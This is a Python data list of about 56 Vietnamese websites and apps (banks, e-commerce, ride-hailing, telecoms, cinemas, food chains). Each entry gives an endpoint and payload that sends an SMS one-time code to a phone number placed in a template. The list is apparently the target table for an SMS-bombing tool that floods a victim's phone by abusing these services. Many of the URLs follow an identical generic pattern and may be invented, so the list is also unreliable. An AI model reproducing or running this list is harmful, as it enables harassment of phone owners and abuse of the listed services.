API_LIST = [
    {"name": "Tiki", "method": "POST", "url": "https://api.tiki.vn/sc/v2/phone/request-otp", "data": {"phone_number": "{phone}"}},
    {"name": "Shopee", "method": "POST", "url": "https://shopee.vn/api/v2/authentication/resend_otp", "json": {"phone": "{phone_zero}", "operation": 5, "client_identifier": {"otp_code": ""}}},
    {"name": "Lazada", "method": "POST", "url": "https://api.lazada.vn/rest/user/request_otp", "data": {"phone": "{phone_zero}", "countryCode": "VN"}},
    {"name": "Meta", "method": "POST", "url": "https://i.instagram.com/api/v1/accounts/send_sms_code/", "data": {"phone_number": "+84{phone}", "device_id": "android-1234567890abcdef"}},
    {"name": "Vntrip", "method": "GET", "url": "https://www.vntrip.vn/sso-be/api/v1/user/request-otp-v2?phoneNumber={phone_zero}"},
    {"name": "ViettelPost", "method": "POST", "url": "https://www.viettelpost.com.vn/forgot-password/send-otp", "data": {"phone": "{phone_zero}"}},
    {"name": "FPT Shop", "method": "POST", "url": "https://fptshop.com.vn/api-fe/login/sent-otp", "json": {"phone": "{phone_zero}"}},
    {"name": "The Gioi Di Dong", "method": "POST", "url": "https://www.thegioididong.com/aj/users/request-otp", "data": {"PhoneNumber": "{phone_zero}"}},
    {"name": "Dien May Xanh", "method": "POST", "url": "https://www.dienmayxanh.com/aj/users/request-otp", "data": {"PhoneNumber": "{phone_zero}"}},
    {"name": "VIB", "method": "POST", "url": "https://vib.com.vn/api/auth/v1/get-otp", "json": {"msisdn": "{phone_zero}", "type": "REGISTER"}},
    {"name": "Techcombank", "method": "POST", "url": "https://mobapi.techcombank.com.vn/auth/v1/otp/request", "json": {"phone_number": "{phone_zero}"}},
    {"name": "MB Bank", "method": "POST", "url": "https://online.mbbank.com.vn/api/v1.0/auth/gen-otp", "json": {"mobile": "{phone_zero}", "type": "LOGIN"}},
    {"name": "TPBank", "method": "POST", "url": "https://ebank.tpb.vn/gateway/api/auth/request-otp", "json": {"username": "{phone_zero}"}},
    {"name": "Sacombank", "method": "POST", "url": "https://www.isacombank.com.vn/corp/api/get-otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Agribank", "method": "POST", "url": "https://ib.agribank.com.vn/api/v1/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "BIDV", "method": "POST", "url": "https://smartbanking.bidv.com.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "VietinBank", "method": "POST", "url": "https://ebanking.vietinbank.vn/api/v1/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "ACB", "method": "POST", "url": "https://online.acb.com.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "VPBank", "method": "POST", "url": "https://neo.vpbank.com.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "HDBank", "method": "POST", "url": "https://ib.hdbank.com.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Grab", "method": "POST", "url": "https://api.grab.com/grabid/v1/phone/otp", "data": {"method": "sms", "countryCode": "VN", "phoneNumber": "{phone_zero}"}},
    {"name": "Gojek", "method": "POST", "url": "https://api.gojekapi.com/v5/customers/phone/verify", "json": {"phone": "+84{phone}"}},
    {"name": "Be", "method": "POST", "url": "https://api.be.com.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Ahamove", "method": "POST", "url": "https://api.ahamove.com/v1/auth/register", "json": {"mobile": "{phone_zero}"}},
    {"name": "ZaloPay", "method": "POST", "url": "https://api.zalopay.vn/v2/account/otp", "json": {"phone_number": "{phone_zero}"}},
    {"name": "MoMo", "method": "POST", "url": "https://owa.momo.vn/public/login/request-otp", "json": {"phoneNumber": "{phone_zero}"}},
    {"name": "VnExpress", "method": "POST", "url": "https://myvne.vnexpress.net/api/v1/auth/request-otp", "json": {"phone": "{phone_zero}", "type": 1}},
    {"name": "Sendo", "method": "POST", "url": "https://api.sendo.vn/user/request_otp", "json": {"phone_number": "{phone_zero}"}},
    {"name": "Tiki Seller", "method": "POST", "url": "https://api.sellercenter.tiki.vn/v1/sellers/otp", "data": {"phone": "{phone_zero}"}},
    {"name": "My Viettel", "method": "POST", "url": "https://myvt.viettel.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "My VNPT", "method": "POST", "url": "https://my.vnpt.com.vn/api/v1/auth/request-otp", "json": {"username": "{phone_zero}"}},
    {"name": "My MobiFone", "method": "POST", "url": "https://api.mymobifone.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Vietnamobile", "method": "POST", "url": "https://bima.vietnamobile.com.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Garena", "method": "POST", "url": "https://sso.garena.com/api/v2/send_otp", "json": {"phone": "{phone_zero}"}},
    {"name": "VNG", "method": "POST", "url": "https://id.zing.vn/v1/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Fahasa", "method": "POST", "url": "https://www.fahasa.com/customer/account/createpost", "data": {"telephone": "{phone_zero}"}},
    {"name": "Con Cung", "method": "POST", "url": "https://concung.com/api/v2/user/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Galaxy Cinema", "method": "POST", "url": "https://api.galaxycine.vn/auth/send-otp", "json": {"phone": "{phone_zero}"}},
    {"name": "CGV Cinema", "method": "POST", "url": "https://www.cgv.vn/api/v1/users/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Lotte Cinema", "method": "POST", "url": "https://lottecinemavn.com/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "BHD Star", "method": "POST", "url": "https://www.bhdstar.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "VTV Go", "method": "POST", "url": "https://api.vtvgo.vn/v1/users/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "FPT Play", "method": "POST", "url": "https://api.fptplay.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "ClipTV", "method": "POST", "url": "https://cliptv.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "VieON", "method": "POST", "url": "https://api.vieon.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "PVOil", "method": "POST", "url": "https://easy.pvoil.com.vn/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Petrolimex", "method": "POST", "url": "https://api.petrolimex.com.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "VinID", "method": "POST", "url": "https://api.vinid.net/api/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Highlands Coffee", "method": "POST", "url": "https://api.highlandscoffee.com.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "The Coffee House", "method": "POST", "url": "https://api.thecoffeehouse.com/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Phuc Long", "method": "POST", "url": "https://api.phuclong.com.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Jollibee", "method": "POST", "url": "https://api.jollibee.com.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "KFC", "method": "POST", "url": "https://api.kfcvietnam.com.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Lotteria", "method": "POST", "url": "https://api.lotteria.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Pizza Hut", "method": "POST", "url": "https://api.pizzahut.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
    {"name": "Domino Pizza", "method": "POST", "url": "https://api.dominos.vn/v1/auth/otp", "json": {"phone": "{phone_zero}"}},
]
